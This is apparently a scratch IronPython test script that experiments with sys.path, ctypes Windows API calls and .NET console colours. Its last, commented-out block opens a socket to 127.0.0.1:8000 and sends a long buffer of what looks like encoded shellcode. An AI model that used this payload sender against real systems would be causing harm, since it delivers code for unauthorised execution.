﻿import clr, sys

# load from zip
#sys.path.append(r"C:\IronPython-2.7.7\Lib.zip\Lib")
sys.path=[]
sys.path.append(r"C:\Python27\Lib")
sys.path.append(r"C:\Python27\Lib\site-packages")
#sys.path.append(r"C:\Users\dimas\Downloads\dist\dist.zip")
print sys.path

import traceback, os


import ctypes
buffer = ctypes.create_string_buffer(100)
ctypes.windll.kernel32.GetWindowsDirectoryA(buffer, len(buffer))
print buffer.value




""" clr.AddReference("System.Windows.Forms")

from System.Windows.Forms import MessageBox
MessageBox.Show("Hello World")

from System.Threading import Thread, ThreadStart
def f():
   Thread.Sleep(1000)
   print "Thread Finished"

f()
"""
clr.AddReference("System")
from System import Console, ConsoleColor
Console.ForegroundColor = ConsoleColor.Red;
Console.WriteLine("Red.");
Console.WriteLine("Another line."); # <-- This line is still white on blue.
Console.ResetColor();


"""
try:
   sys.platform="win32"
   os.environ['TERM'] = 'dumb'
   from prompt_toolkit import prompt
except Exception as e:
   traceback.print_exc(file=sys.stdout)

"""

"""
import socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 8000))

buf =""
buf += "\xdb\xdc\xbf\x88\xb5\x29\x94\xd9\x74\x24\xf4\x5d\x33"
buf += "\xc9\xb1\x59\x83\xc5\x04\x31\x7d\x14\x03\x7d\x9c\x57"
buf += "\xdc\x4e\x5d\x4e\x6b\x4b\xa9\xca\x13\x34\x16\x1e\x46"
buf += "\x0a\x51\xd1\x24\xef\x8b\xee\xf8\xb5\x5e\x0c\xa1\x5c"
buf += "\x05\x40\xac\xe4\x39\xda\x27\x7c\xf6\x3a\xb9\x31\xcb"
buf += "\xfe\x62\x47\x21\x47\xbe\x5d\x4c\x0b\x1a\x94\x2c\xc1"
buf += "\x41\xb7\xc9\x7d\x06\x8e\x55\x8c\x08\xa1\x2f\xc9\x16"
buf += "\x87\x3f\xbf\x64\xc3\x0a\xf7\xc1\x0a\x66\xad\x8c\xe1"
buf += "\xb5\xf9\xfe\x61\x3b\x23\x2c\x28\x86\xc4\x63\xa4\xb8"
buf += "\x69\xa8\x49\x72\x8a\x39\x48\xd0\xe8\xd8\xe2\xd8\xfe"
buf += "\x88\x0b\xc2\x08\x4d\xb7\x32\x05\x14\x26\x55\x4a\x41"
buf += "\xdd\xed\x75\xeb\xdd\xcd\x3d\xde\x29\x8c\x6c\xaa\x18"
buf += "\x23\x61\x25\x56\x3c\x26\x8e\xdf\x26\xc9\xaf\xd5\x6a"
buf += "\xee\xfa\xc0\xf2\xc7\x3e\xfd\x07\xfc\x57\x2d\x5f\x57"
buf += "\xc7\x49\xd6\x37\x90\xc3\xfd\xea\x24\xc4\xd5\xbd\x15"
buf += "\x62\x27\xbb\x70\xfc\x53\xf1\x5a\xa5\xd4\x9b\xa9\xbd"
buf += "\x0d\xa1\xf4\x47\xca\x9a\xc9\xba\x92\xc7\x64\xf2\x45"
buf += "\xb8\xe9\x71\x0e\x60\xd5\xbf\xc5\x51\x39\xfe\x60\xa3"
buf += "\x83\xfc\xa7\xd0\xc1\x36\x62\x10\xb8\x9e\x01\x42\x03"
buf += "\xe4\x77\x82\xd6\x51\xae\x9d\xfc\x09\x06\x92\x74\x7b"
buf += "\x3b\xfa\xc8\x9e\x78\xeb\xb7\x90\x10\x75\xeb\xce\x51"
buf += "\x5b\x0b\x8a\xbf\x50\x8a\xa5\x33\x1c\xac\x08\x3a\x90"
buf += "\xde\x66\xf1\xcd\x98\x69\xd5\xa8\x9b\xdc\x1e\x1a\xc6"
buf += "\x16\xe1\xfe\x06\xf6\x73\x3a\x24\x35\x5f\xcb\x41\x61"
buf += "\x83\x9c\x92\x61\x5e\x0f\x31\x71\x30\xdf\x95\x19\x2d"
buf += "\xd7\xba\x8c\x14\xd0\x35\x3c\xb9\xc7\x33\x86\x6a\x15"
buf += "\xf5\x9b\x07\xb8\x03\x8f\x86\x8d\xc7\xe3\x77\x6f\x2a"
buf += "\xeb\xad\xe0\x26\x4a\xe6\x23\x13\xc9\xdb\xe4\xf2\x0b"
buf += "\xe2\x7f\x64\x62\xd8\x41\xc3\x69\xbc\x14\x57\x66\x26"
buf += "\xc4\x10\x56"

sock.send(buf)
sock.close()
"""